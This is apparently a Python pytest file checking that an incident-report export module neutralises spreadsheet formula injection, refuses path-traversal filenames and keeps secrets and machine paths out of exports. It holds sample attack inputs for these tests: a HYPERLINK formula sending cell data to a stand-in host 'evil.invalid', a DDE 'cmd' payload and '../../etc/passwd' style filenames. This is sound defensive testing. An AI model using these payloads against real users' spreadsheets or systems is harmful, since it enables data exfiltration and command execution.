"""Exports: where a file may be written, and what a spreadsheet does with a cell.

Two of these are security tests rather than formatting tests, and they are the reason this file
exists. An export destination is the only place a caller influences a filesystem path, and a CSV
of security incidents opened in a spreadsheet is the classic formula-injection target.
"""

from __future__ import annotations

import csv
import io
import json
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from tests.unit.response.test_lifecycle import CONTEXT, _assessment, _event, _ulid
from vigil.analytics.export import (
    FORMULA_PREFIXES,
    INCIDENT_COLUMNS,
    ExportFormat,
    export_path,
    neutralise,
    write_csv,
    write_report,
    write_summary_csv,
)
from vigil.analytics.queries import AnalyticsQueries, Window
from vigil.analytics.reports import Report, ReportBuilder
from vigil.analytics.serialise import report_to_json, write_json
from vigil.config.loader import load_settings
from vigil.config.schema.storage import StorageConfig
from vigil.core.clock import ManualClock
from vigil.core.errors import PersistenceError
from vigil.core.ids import UlidFactory
from vigil.core.rng import seeded_rng
from vigil.domain.enums import EventType
from vigil.domain.observation import SubjectKey
from vigil.observability.logging import get_logger
from vigil.observability.metrics import MetricsRegistry
from vigil.persistence.database import Database
from vigil.persistence.queries import ALL_INCIDENTS, IncidentFilter
from vigil.persistence.repositories.evidence import EvidenceRepository
from vigil.persistence.repositories.incidents import IncidentRepository
from vigil.response.incident_manager import IncidentManager
from vigil.response.operator_actions import OperatorActions

WALL = datetime(2026, 3, 1, 2, 41, tzinfo=UTC)
WINDOW = Window(since=WALL - timedelta(days=7), until=WALL + timedelta(days=1))
# What an attacker puts in a field that will be exported and opened in a spreadsheet.
HOSTILE_NOTE = '=HYPERLINK("http://evil.invalid?x="&A1,"click me")'


@pytest.fixture
def store(tmp_path: Path) -> Iterator[Database]:
    database = Database(
        tmp_path / "vigil.sqlite3",
        config=StorageConfig(),
        clock=ManualClock(wall_start=WALL),
        logger=get_logger("test.db"),
        metrics=MetricsRegistry(),
    )
    database.open()
    try:
        yield database
    finally:
        database.close()


def _manager(store: Database, *, seed: int = 21) -> IncidentManager:
    return IncidentManager(
        incidents=IncidentRepository(store),
        settings=load_settings(env={}, use_dotenv=False, config_dir=Path("config")).settings,
        clock=ManualClock(wall_start=WALL),
        ulids=UlidFactory(ManualClock(wall_start=WALL), seeded_rng(seed, "export")),
        logger=get_logger("test.incidents"),
        metrics=MetricsRegistry(),
    )


def _report(store: Database, *, note: str | None = None, count: int = 1) -> Report:
    manager = _manager(store)
    for index in range(count):
        outcome = manager.record(
            _event(
                candidate_id=_ulid(index + 1),
                at=WALL + timedelta(seconds=index),
                subject=SubjectKey("track", str(index + 1)),
            ),
            _assessment(),
            CONTEXT,
        )
        if note is not None and index == 0:
            OperatorActions(
                manager=manager,
                incidents=IncidentRepository(store),
                clock=ManualClock(wall_start=WALL),
                logger=get_logger("test.operator"),
                metrics=MetricsRegistry(),
            ).annotate(outcome.incident_id, note)
    builder = ReportBuilder(
        analytics=AnalyticsQueries(store),
        incidents=IncidentRepository(store),
        evidence=EvidenceRepository(store),
    )
    return builder.build(WINDOW, generated_wall_utc=WALL + timedelta(minutes=1))


# ---------------------------------------------------------------- CSV injection


@pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
def test_a_cell_that_would_become_a_formula_is_neutralised(prefix: str) -> None:
    hostile = f"{prefix}cmd|' /C calc'!A0"
    safe = neutralise(hostile)
    assert safe == f"'{hostile}"
    assert not safe.startswith(FORMULA_PREFIXES)
    # The value is preserved: a spreadsheet strips the marker on display.
    assert safe[1:] == hostile


def test_an_ordinary_cell_is_untouched() -> None:
    for value in ("gate-north", "INC-20260301-ABCDEF", "a note about a bag", "0.92", ""):
        assert neutralise(value) == value


def test_a_hostile_operator_note_cannot_become_a_formula(store: Database) -> None:
    """The actual attack: a note written through the API, exported, opened in a spreadsheet."""
    report = _report(store, note=HOSTILE_NOTE)
    buffer = io.StringIO()
    write_csv(report, buffer)

    rows = [r for r in buffer.getvalue().splitlines() if not r.startswith("#")]
    reader = csv.DictReader(io.StringIO("\n".join(rows)))
    parsed = list(reader)
    assert len(parsed) == 1
    note = parsed[0]["operator_note"]
    assert note.startswith("'=HYPERLINK")
    assert not note.startswith("=")
    # And nothing was lost: the original text is still readable.
    assert HOSTILE_NOTE in note


def test_csv_quoting_survives_delimiters_and_newlines(store: Database) -> None:
    report = _report(store, note='a note, with "quotes", a\nnewline and a\ttab')
    buffer = io.StringIO()
    write_csv(report, buffer)
    rows = [r for r in buffer.getvalue().splitlines() if not r.startswith("#")]
    parsed = list(csv.DictReader(io.StringIO("\n".join(rows))))
    assert len(parsed) == 1, "an embedded newline must not split a row"
    assert "newline" in parsed[0]["operator_note"]


def test_the_header_is_the_declared_column_set(store: Database) -> None:
    buffer = io.StringIO()
    write_csv(_report(store), buffer)
    rows = [r for r in buffer.getvalue().splitlines() if not r.startswith("#")]
    assert next(csv.reader(io.StringIO(rows[0]))) == list(INCIDENT_COLUMNS)


def test_the_csv_preamble_states_the_window_and_the_caveats(store: Database) -> None:
    """A file of numbers with no statement of what it covers is what this avoids."""
    buffer = io.StringIO()
    write_csv(_report(store), buffer)
    comments = [r for r in buffer.getvalue().splitlines() if r.startswith("#")]
    joined = "\n".join(comments)
    assert "VIGIL-88 incident export" in joined
    assert "window=" in joined
    assert "incidents_total=1" in joined
    assert "truncated=no" in joined
    assert "caveat:" in joined
    assert "not probabilities" in joined


def test_an_empty_export_still_has_a_header_and_a_preamble(store: Database) -> None:
    builder = ReportBuilder(
        analytics=AnalyticsQueries(store),
        incidents=IncidentRepository(store),
        evidence=EvidenceRepository(store),
    )
    empty = builder.build(WINDOW, generated_wall_utc=WALL)
    buffer = io.StringIO()
    assert write_csv(empty, buffer) == 0
    text = buffer.getvalue()
    assert "incidents_total=0" in text
    assert "display_ref" in text
    assert "fact about the window" in text


def test_the_summary_csv_reports_unavailable_as_empty_not_zero(store: Database) -> None:
    """A metric that could not be computed must not read as a measurement of zero."""
    buffer = io.StringIO()
    written = write_summary_csv(_report(store), buffer)
    assert written > 0
    rows = list(csv.DictReader(io.StringIO(buffer.getvalue())))
    acknowledgement = {r["key"]: r["value"] for r in rows if r["metric"] == "acknowledgement"}
    assert acknowledgement["count"] == "0"
    assert acknowledgement["mean_ms"] == "", "nobody acknowledged: unavailable, not 0 ms"
    assert acknowledgement["p95_ms"] == ""
    # And every row says what population it came from.
    assert all(r["population"] for r in rows if r["metric"] != "")


# ---------------------------------------------------------------- JSON


def test_the_json_export_carries_the_window_filter_and_coverage(store: Database) -> None:
    report = _report(store, count=2)
    payload = report_to_json(report)
    assert payload["schema"] == "vigil-88.report.v1"
    assert payload["window"]["since_utc"] == WINDOW.since.isoformat()
    assert payload["filters"]["camera_ids"] == []
    assert payload["coverage"]["rows_included"] == 2
    assert payload["coverage"]["truncated"] is False
    assert payload["summary"]["incidents_total"] == 2
    assert payload["metric_definitions"]["dismissal_rate"]["population"]


def test_the_json_export_includes_the_explanation_timeline_and_evidence_refs(
    store: Database,
) -> None:
    payload = report_to_json(_report(store))
    incident = payload["incidents"][0]  # type: ignore[index]
    assert incident["explanation"]["trigger_summary"]
    assert incident["explanation"]["severity_factors"]
    assert incident["explanation"]["thresholds"]
    assert [t["to_status"] for t in incident["timeline"]] == ["candidate", "confirmed"]
    assert incident["evidence"]["count"] == 0
    assert incident["evidence"]["evidence_ids"] == []


def test_a_json_export_round_trips_through_a_parser(store: Database) -> None:
    """ "Opens correctly outside the system" is the exit criterion; this is that, mechanically."""
    buffer = io.StringIO()
    assert write_json(_report(store, count=3), buffer) == 3
    reloaded = json.loads(buffer.getvalue())
    assert len(reloaded["incidents"]) == 3
    assert reloaded["caveats"]


def test_no_secret_reaches_an_export(store: Database) -> None:
    """A model descriptor and a config hash are safe to publish; a source locator never gets
    copied onto an incident in the first place (05 §4), so there is nothing here to leak."""
    text = json.dumps(report_to_json(_report(store)))
    for forbidden in ("password", "secret", "token", "rtsp://", "Authorization"):
        assert forbidden.lower() not in text.lower()


# ---------------------------------------------------------------- destinations


@pytest.mark.parametrize(
    "filename",
    [
        "../escape.csv",
        "../../etc/passwd.csv",
        "sub/dir/report.csv",
        "sub\\dir\\report.csv",
        "C:/report.csv",
        "/abs/report.csv",
        ".hidden.csv",
        "",
    ],
)
def test_an_export_filename_that_is_a_path_is_refused(tmp_path: Path, filename: str) -> None:
    with pytest.raises(PersistenceError):
        export_path(tmp_path / "exports", filename)


@pytest.mark.parametrize("filename", ["report.txt", "report", "report.sqlite3", "report.exe"])
def test_an_export_must_carry_a_known_suffix(tmp_path: Path, filename: str) -> None:
    with pytest.raises(PersistenceError, match=r".csv, .json, .pdf"):
        export_path(tmp_path / "exports", filename)


def test_a_plain_filename_resolves_inside_the_exports_directory(tmp_path: Path) -> None:
    root = tmp_path / "exports"
    resolved = export_path(root, "incidents-2026-03.csv")
    assert resolved.parent == root.resolve()
    assert resolved.is_relative_to(root.resolve())


def test_writing_an_export_produces_a_complete_file(store: Database, tmp_path: Path) -> None:
    root = tmp_path / "exports"
    result = write_report(
        _report(store, count=2),
        exports_dir=root,
        filename="incidents.csv",
        export_format=ExportFormat.CSV,
    )
    assert result.path.is_file()
    assert result.rows == 2
    assert result.bytes_written == result.path.stat().st_size
    assert result.format is ExportFormat.CSV
    # Nothing half-written survives.
    assert not list(root.glob("*.part"))


def test_writing_a_json_export_produces_valid_json(store: Database, tmp_path: Path) -> None:
    result = write_report(
        _report(store),
        exports_dir=tmp_path / "exports",
        filename="incidents.json",
        export_format=ExportFormat.JSON,
    )
    assert json.loads(result.path.read_text(encoding="utf-8"))["schema"]


def test_a_failed_write_leaves_nothing_behind(
    store: Database, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root = tmp_path / "exports"
    root.mkdir()

    def refuse(self: Path, target: object) -> None:
        raise OSError(28, "no space left on device")

    monkeypatch.setattr(Path, "replace", refuse)
    with pytest.raises(PersistenceError, match="cannot write the export"):
        write_report(
            _report(store),
            exports_dir=root,
            filename="incidents.csv",
            export_format=ExportFormat.CSV,
        )
    assert not list(root.glob("*.part"))
    assert not (root / "incidents.csv").exists()


def test_an_unwritable_exports_directory_reports_usefully(
    store: Database, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        Path, "mkdir", lambda *_a, **_k: (_ for _ in ()).throw(OSError(13, "denied"))
    )
    with pytest.raises(PersistenceError, match="exports directory"):
        write_report(
            _report(store),
            exports_dir=tmp_path / "exports",
            filename="incidents.csv",
            export_format=ExportFormat.CSV,
        )


# ---------------------------------------------------------------- filters echoed


def test_the_export_echoes_the_filter_it_was_built_with(store: Database) -> None:
    manager = _manager(store)
    manager.record(_event(candidate_id=_ulid(1)), _assessment(), CONTEXT)
    builder = ReportBuilder(
        analytics=AnalyticsQueries(store),
        incidents=IncidentRepository(store),
        evidence=EvidenceRepository(store),
    )
    filters = IncidentFilter(
        camera_ids=("gate-north",), event_types=(EventType.INTRUSION,), open_only=True
    )
    report = builder.build(WINDOW, filters=filters, generated_wall_utc=WALL)
    payload = report_to_json(report)
    assert payload["filters"]["camera_ids"] == ["gate-north"]
    assert payload["filters"]["event_types"] == ["intrusion"]
    assert payload["filters"]["open_only"] is True

    buffer = io.StringIO()
    write_csv(report, buffer)
    assert "gate-north" in buffer.getvalue()


def test_a_filter_that_matches_nothing_exports_an_empty_table(store: Database) -> None:
    _manager(store).record(_event(candidate_id=_ulid(1)), _assessment(), CONTEXT)
    builder = ReportBuilder(
        analytics=AnalyticsQueries(store),
        incidents=IncidentRepository(store),
        evidence=EvidenceRepository(store),
    )
    report = builder.build(
        WINDOW,
        filters=IncidentFilter(event_types=(EventType.FIRE,)),
        generated_wall_utc=WALL,
    )
    buffer = io.StringIO()
    assert write_csv(report, buffer) == 0
    assert "incidents_total=0" in buffer.getvalue()
    assert report_to_json(report)["incidents"] == []


def test_the_default_filter_is_a_shared_singleton() -> None:
    """A frozen no-op filter, so a default argument does not construct one per call site."""
    assert IncidentFilter() == ALL_INCIDENTS
    assert ALL_INCIDENTS.describes_everything


def test_an_export_carries_relative_evidence_paths_not_machine_paths(
    store: Database,
) -> None:
    """A report leaves the machine. An absolute path in it would publish the operator's user
    name and directory layout for no benefit: the API resolves a stored path, not a caller."""
    report = _report(store)
    handle = io.StringIO()
    write_csv(report, handle)
    text = handle.getvalue()
    assert ":\\" not in text  # no Windows drive letters
    assert "/home/" not in text and "/Users/" not in text
    for row in report.incidents:
        for path in row.evidence_paths:
            assert not Path(path).is_absolute()


def test_an_export_does_not_carry_the_configuration_only_its_hash(
    store: Database,
) -> None:
    """`SystemSnapshot` is version, config hash, device and two timings. The hash identifies a
    configuration without reproducing it, so no setting, path or secret rides along."""
    report = _report(store)
    document = report_to_json(report)
    incidents = document["incidents"]
    assert isinstance(incidents, list)
    system = incidents[0]["system"]
    assert isinstance(system, dict)
    assert set(system) == {
        "version",
        "config_hash",
        "device",
        "pipeline_fps",
        "inference_latency_p95_ms",
    }
